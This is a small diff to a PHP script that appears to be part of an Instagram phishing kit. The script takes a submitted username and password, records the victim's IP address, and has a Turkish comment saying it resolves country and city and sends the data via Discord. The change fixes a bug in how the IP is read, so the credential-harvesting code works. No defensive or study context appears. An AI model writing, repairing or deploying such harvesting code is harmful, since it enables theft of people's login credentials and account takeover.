@@ -3,7 +3,7 @@
 //instagram.com/hakanburning
 $username =$_POST['username'];
 $password = $_POST['password'];
-$ip = $SERVER['REMOTE_ADDR'];
+$ip = $_SERVER['REMOTE_ADDR'];
 
 ################################
 ######## Sistem otomatik olarak ulke ve şehri ayarlayıp discord üzeriden göndermekte.
